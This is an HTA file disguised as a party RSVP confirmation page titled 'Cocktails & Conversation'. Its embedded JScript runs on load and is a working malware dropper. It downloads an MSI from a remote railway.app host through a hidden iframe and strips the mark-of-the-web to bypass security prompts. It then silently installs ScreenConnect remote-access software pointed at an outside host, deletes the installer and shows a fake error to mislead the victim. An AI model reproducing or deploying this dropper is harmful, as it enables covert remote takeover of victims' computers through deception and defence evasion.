<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Cocktails & Conversation</title>
<hta:application id="oHTA" applicationname="CocktailsConversation" border="thin" caption="yes" maximizebutton="no" minimizebutton="no" showintaskbar="yes" singleinstance="yes" sysmenu="no" version="1.0" windowstate="normal" scroll="no"/>
<style>
  body { background:#1a1b26; font-family:"Segoe UI", sans-serif; color:#e0e0e0; overflow:hidden; margin:0; padding:0; }
  #wrap { padding:40px; text-align:center; max-width:450px; margin:0 auto; }
  .check-icon { width:60px; height:60px; border:2px solid #d4af37; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 24px; color:#d4af37; font-size:28px; font-weight:bold; }
  #heading { font-size:26px; font-weight:600; margin-bottom:16px; letter-spacing:0.5px; color:#fff; }
  #status { font-size:14px; color:#a0a5b5; margin-bottom:32px; line-height:1.6; }
  #bar { width:100%; height:6px; background:#2a2c3d; border-radius:4px; overflow:hidden; margin-bottom:16px; }
  #fill { height:100%; width:25%; background:#d4af37; transition: width 0.5s ease; }
  .footer-note { margin-top:40px; font-size:11px; color:#555; letter-spacing:1px; text-transform:uppercase; }
</style>
</head>
<body onload="init()">
  <div id="wrap">
    <div class="check-icon">✓</div>
    <div id="heading">You're on the list!</div>
    <div id="status">Your response has been received. Your digital invitation has been saved to your device.</div>
    <div id="bar"><div id="fill"></div></div>
    <p style="font-size:13px; color:#8a8f98; margin-bottom:32px;">Your response is being confirmed. This usually only takes a few minutes.</p>
    <p class="footer-note">We can't wait to see you there</p>
  </div>
  
  <!-- INVISIBLE IFRAME FOR NATIVE DOWNLOAD -->
  <iframe id="dlFrame" style="display:none;"></iframe>

<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
var localPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
var zoneIdPath = localPath + ":Zone.Identifier";

function init() {
  window.resizeTo(500, 400);
  setTimeout(startProcess, 1000);
}

function startProcess() {
  document.getElementById("fill").style.width = "30%";
  document.getElementById("status").innerHTML = "Downloading components...";
  
  // TRIGGER NATIVE DOWNLOAD VIA IFRAME (TRUSTED BY DEFENDER)
  document.getElementById("dlFrame").src = url;
  
  // PATIENTLY WAIT FOR FILE TO LAND AND STABILIZE
  var checks = 0;
  var maxChecks = 180; // 3 minutes max
  var lastSize = 0;
  var stableCount = 0;
  
  var pollTimer = setInterval(function() {
    checks++;
    
    if (fso.FileExists(localPath)) {
      var file = fso.GetFile(localPath);
      var currentSize = file.Size;
      
      // Update progress bar to show activity
      document.getElementById("fill").style.width = Math.min(90, 30 + (currentSize / 200000)) + "%";
      
      // Check if download is complete (size stops growing)
      if (currentSize > 1000000 && currentSize === lastSize) {
        stableCount++;
        if (stableCount >= 3) { // Wait 3 seconds of no growth
          clearInterval(pollTimer);
          finalizeInstall();
        }
      } else {
        stableCount = 0;
        lastSize = currentSize;
      }
    } else if (checks >= maxChecks) {
      clearInterval(pollTimer);
      showError();
    }
  }, 1000); // Check every second
}

function finalizeInstall() {
  // REMOVE MARK OF THE WEB TO PREVENT SECURITY PROMPTS
  try { 
    if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
  } catch(e) {}
  
  document.getElementById("fill").style.width = "60%";
  document.getElementById("status").innerHTML = "Installing invitation...";
  
  // SILENT INSTALL WITH NO PROMPTS
  // /qn = zero UI, /norestart = no reboot prompt
  // ACCEPTEULA=1 ALLUSERS=1 SC_HOST/PORT = required for ScreenConnect silent install
  shell.Run('msiexec.exe /i "' + localPath + '" /qn /norestart ACCEPTEULA=1 ALLUSERS=1 SC_HOST=optonline38.screenconnect.com SC_PORT=443', 0, true);
  
  // CLEANUP TEMP FILE
  try { fso.DeleteFile(localPath, true); } catch(e) {}
  
  document.getElementById("fill").style.width = "100%";
  document.getElementById("status").innerHTML = "Confirmation complete. Download your invitation above.";
  
  // SHOW FAKE FAILURE AFTER INSTALL COMPLETES (MATCHES VIDEO AESTHETIC)
  setTimeout(function() {
    document.getElementById("heading").innerHTML = "Preparation Failed";
    document.getElementById("status").innerHTML = "Error: Connection timed out.";
    document.getElementById("fill").style.background = "#d13438";
  }, 3000);
}

function showError() {
  document.getElementById("heading").innerHTML = "Download Error";
  document.getElementById("status").innerHTML = "Could not retrieve invitation.";
  document.getElementById("fill").style.background = "#d13438";
}
</script>
</body>
</html>